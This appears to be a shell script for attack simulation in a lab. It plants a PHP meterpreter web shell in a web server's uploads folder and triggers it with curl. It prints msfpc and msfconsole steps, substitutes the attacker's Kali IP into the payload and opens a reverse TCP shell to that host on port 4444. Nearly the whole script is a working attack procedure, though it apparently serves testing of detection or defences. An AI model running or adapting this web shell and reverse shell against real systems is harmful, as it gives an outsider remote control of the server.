#/bin/sh

echo -e "\e[92mSimulate a malicious file upload, which executes a reverse TCP meterpreter to Kali on port 4444"
echo -e "\e[92mThis scenario is a multi-step, please follow these actions:"
echo -e "\e[92m1) Generate the PHP Listener on a kali machine (replace IP address with your kali IP):"
echo -e "\t$> msfpc php reverse stageless tcp 172.17.0.21 4444"

echo -e "\e[92m2) Start listener: "
echo -e "\t$> msfconsole -r ./php-meterpreter-stageless-reverse-tcp-4444-php.rc"

printf 'Please Enter your Kali IP: '
read -r ip_addr

if [ -z "$ip_addr" ]
then
      echo "No IP Provided, defaulting to 172.17.0.21"
      ip_addr="172.17.0.21"
else
      echo "Starting remote shell to: $ip_addr:4444"

fi

cat /var/www/html/uploads/php-meterpreter-stageless-reverse-tcp-4444.php | sed "s/172\.17\.0\.21/$ip_addr/g" > /var/www/html/uploads/webshell.php

curl -s http://localhost/uploads/webshell.php & >/dev/null

echo -e "Execute commands from the meterpreter shell"
sleep 5
